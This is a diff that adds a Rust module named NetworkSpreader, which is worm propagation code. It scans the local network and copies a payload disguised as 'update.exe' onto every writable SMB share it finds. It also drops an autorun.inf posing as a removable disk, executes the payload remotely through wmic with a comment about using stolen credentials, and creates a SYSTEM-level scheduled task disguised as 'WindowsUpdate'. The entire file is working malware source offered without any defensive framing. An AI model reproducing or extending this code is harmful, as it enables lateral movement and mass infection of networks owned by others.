@@ -1,0 +1,90 @@
+use std::process::Command;
+use std::fs;
+use std::path::Path;
+use crate::discovery::{NetworkScanner, DiscoveredHost};
+
+pub struct NetworkSpreader;
+
+impl NetworkSpreader {
+    pub fn spread_via_shares(exe_path: &str) -> Result<u32, Box<dyn std::error::Error>> {
+        let mut infected = 0;
+        
+        // Get list of network hosts
+        let hosts = NetworkScanner::scan_local_network();
+        
+        for host in hosts {
+            // Enumerate shares on each host
+            let shares = NetworkScanner::enumerate_shares(host.ip);
+            
+            for share in shares {
+                let remote_path = format!("\\\\{}\\{}", host.ip, share);
+                
+                // Try to access share
+                if Self::test_access(&remote_path) {
+                    // Copy payload to share
+                    let dest = format!("{}\\update.exe", remote_path);
+                    if fs::copy(exe_path, &dest).is_ok() {
+                        infected += 1;
+                        
+                        // Also try to create autorun
+                        Self::create_autorun(&remote_path, "update.exe");
+                    }
+                }
+            }
+        }
+        
+        Ok(infected)
+    }
+    
+    fn test_access(path: &str) -> bool {
+        Path::new(path).exists()
+    }
+    
+    fn create_autorun(share_path: &str, exe_name: &str) {
+        let autorun_content = format!(
+            "[AutoRun]\nopen={}\nicon=%SystemRoot%\\system32\\shell32.dll,4\nlabel=Removable Disk\n",
+            exe_name
+        );
+        
+        let autorun_path = format!("{}\\autorun.inf", share_path);
+        let _ = fs::write(&autorun_path, autorun_content);
+    }
+    
+    pub fn spread_via_wmi(target: &str, exe_path: &str) -> Result<(), Box<dyn std::error::Error>> {
+        // Use WMI to execute payload remotely
+        let cmd = format!(
+            "wmic /node:{} /user:{} /password:{} process call create \"cmd /c {}\"",
+            target,
+            "username", // Would use stolen creds
+            "password",
+            exe_path
+        );
+        
+        Command::new("cmd")
+            .args(&["/c", &cmd])
+            .output()?;
+        
+        Ok(())
+    }
+    
+    pub fn spread_via_scheduled_task(target: &str, exe_path: &str) -> Result<(), Box<dyn std::error::Error>> {
+        // Create scheduled task on remote system
+        let task_name = "WindowsUpdate";
+        let remote_cmd = format!(
+            "schtasks /create /s {} /tn {} /tr {} /sc onlogon /ru system /f",
+            target, task_name, exe_path
+        );
+        
+        Command::new("cmd")
+            .args(&["/c", &remote_cmd])
+            .output()?;
+        
+        // Run immediately
+        let run_cmd = format!("schtasks /run /s {} /tn {}", target, task_name);
+        Command::new("cmd")
+            .args(&["/c", &run_cmd])
+            .output()?;
+        
+        Ok(())
+    }
+}
